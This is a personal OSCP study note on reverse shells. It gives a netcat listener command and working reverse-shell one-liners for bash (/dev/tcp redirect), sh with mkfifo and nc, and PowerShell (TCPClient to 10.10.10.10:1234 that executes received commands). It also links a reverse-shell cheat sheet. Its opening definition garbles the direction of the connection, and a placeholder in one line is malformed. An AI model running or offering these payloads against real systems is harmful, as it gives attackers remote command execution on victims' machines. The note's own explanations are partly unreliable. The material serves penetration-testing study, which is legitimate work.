---
title: technique-note
type: note
permalink: oscp/templates/technique-note-1-3
---

---
title: Reverse Shell
category: other
created: 2026-08-11
tags: [technique, other]
---

# Reverse Shell

## What it is
- Most common type of shell that has the attacker connect to us so we can run commands on their machine
- Use `netcat` listener on our machine to run commands which is used for the target to connect to us

## When to use it
- When a identify that we can do remote code execution on the target

## Commands
#### Starting a listener using netcat
```bash
nc -lvnp 1234
```
- `-l` listen mode
- `-v` verbose mode
- `-n` Disable dns resolution to it connects from ip to speed up connection
- `-p` used to specify the port to which the target listens to, in this case `1234`

#### Linux Reverse Shells
```bash
bash -c 'bash -i >& /dev/tcp/$ip$/$listen 0>&1'
```
- `bash -c '...'` run commands inside the quotes
- `bash -i` start interactive shell 
- `>&` takes the output and errors, bundles them together to whatever comes next, `>` for redirecting, and `&` for bundling
- `/dev/tcp/$ip/$listen` destination for the redirection, treated as a network connection to the IP on the port `$listen`
- `0>&1` redirect inputs to where output is going, our network `$ip:$port$`
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f
```

#### PowerShell reverse shell
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```
## Things to know
- Command executed depend on the OS of the target
- [Payload All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary) is a reverse shell cheat sheet
#### Netcat Connection
```bash
nc $target_ip $listen
```


## Boxes where I used this
- [[]]

## References
-